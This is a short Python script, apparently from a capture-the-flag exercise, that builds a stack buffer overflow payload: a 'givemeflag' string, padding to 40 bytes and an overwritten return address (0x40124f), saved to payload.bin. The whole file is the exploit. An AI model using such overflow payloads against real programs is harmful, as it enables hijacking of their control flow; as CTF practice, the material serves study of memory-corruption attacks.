import struct

payload=b'givemeflag\n\x00'+b'A'*(40-len(b'givemeflag\n\x00'))+struct.pack('<Q',0x40124f)
open('payload.bin','wb').write(payload)
print('len=',len(payload))